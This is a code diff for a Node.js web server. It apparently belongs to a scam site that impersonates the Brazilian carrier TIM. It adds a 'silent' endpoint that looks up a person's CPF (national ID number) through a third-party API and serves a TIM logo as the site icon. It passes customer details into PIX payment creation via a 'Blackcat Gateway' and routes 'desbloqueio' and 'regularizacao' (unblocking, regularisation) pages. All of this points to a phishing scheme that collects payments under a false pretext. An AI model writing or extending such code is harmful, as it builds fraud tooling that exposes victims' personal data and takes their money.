@@ -7,6 +7,7 @@ const {
   getMappingByExternalRef,
   getMappingsByPhone
 } = require('./lib/whiteLabel');
+const { consultarCPF } = require('./lib/apisegura');
 
 // Load .env variables
 function loadEnv() {
@@ -58,6 +59,58 @@ const server = http.createServer((req, res) => {
     return;
   }
 
+  // Handle direct /favicon.ico requests
+  if (pathname === '/favicon.ico') {
+    const iconPath = path.join(__dirname, 'images', 'glossy-tim-mobile-logo-rounded-square-app-icon-free-png.webp');
+    if (fs.existsSync(iconPath)) {
+      res.writeHead(200, {
+        'Content-Type': 'image/webp',
+        'Cache-Control': 'public, max-age=86400'
+      });
+      fs.createReadStream(iconPath).pipe(res);
+      return;
+    }
+  }
+
+  // API Route: /api/cpf (Consulta silenciosa de CPF via APIsegura)
+  if (pathname === '/api/cpf' && (req.method === 'GET' || req.method === 'POST')) {
+    const handleCpfRequest = async (cpf) => {
+      const cleanCpf = (cpf || '').replace(/\D/g, '');
+      if (cleanCpf.length !== 11) {
+        res.writeHead(400, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: false, error: 'CPF deve conter 11 dígitos' }));
+        return;
+      }
+
+      try {
+        const result = await consultarCPF(cleanCpf);
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify(result));
+      } catch (err) {
+        console.error('Erro ao consultar CPF:', err.message);
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: false, error: 'Erro ao consultar CPF' }));
+      }
+    };
+
+    if (req.method === 'GET') {
+      const cpf = parsedUrl.searchParams.get('cpf');
+      handleCpfRequest(cpf);
+      return;
+    }
+
+    if (req.method === 'POST') {
+      let body = '';
+      req.on('data', chunk => { body += chunk; });
+      req.on('end', () => {
+        let parsed = {};
+        try { parsed = JSON.parse(body); } catch (e) {}
+        handleCpfRequest(parsed.cpf);
+      });
+      return;
+    }
+  }
+
   // API Route: /api/pix/create (Blackcat Gateway)
   if (pathname === '/api/pix/create' && req.method === 'POST') {
     let body = '';
@@ -66,7 +119,7 @@ const server = http.createServer((req, res) => {
       try {
         let parsed = {};
         try { parsed = JSON.parse(body); } catch (e) {}
-        const { amount, telefone, productName, ...utmParams } = parsed;
+        const { amount, telefone, productName, customer, ...utmParams } = parsed;
 
         if (!amount) {
           res.writeHead(400, { 'Content-Type': 'application/json' });
@@ -74,7 +127,7 @@ const server = http.createServer((req, res) => {
           return;
         }
 
-        const sale = await createPixSale(amount, telefone, utmParams, null, productName);
+        const sale = await createPixSale(amount, telefone, utmParams, null, productName, customer);
         const pData = sale.data?.paymentData || {};
 
         res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -170,6 +223,11 @@ const server = http.createServer((req, res) => {
     }
   }
 
+  // Handle /desbloqueio and /regularizacao routes
+  if (resolvedPath === '/desbloqueio' || resolvedPath === '/regularizacao') {
+    resolvedPath = '/desbloqueio.html';
+  }
+
   // Static File Serving
   let filePath = path.join(__dirname, resolvedPath === '/' ? 'index.html' : resolvedPath);
 
@@ -201,7 +259,12 @@ const server = http.createServer((req, res) => {
 function serveFile(filePath, res) {
   const ext = path.extname(filePath).toLowerCase();
   const mime = MIME_TYPES[ext] || 'application/octet-stream';
-  res.writeHead(200, { 'Content-Type': mime });
+  res.writeHead(200, {
+    'Content-Type': mime,
+    'Cache-Control': 'no-cache, no-store, must-revalidate',
+    'Pragma': 'no-cache',
+    'Expires': '0'
+  });
   fs.createReadStream(filePath).pipe(res);
 }
 
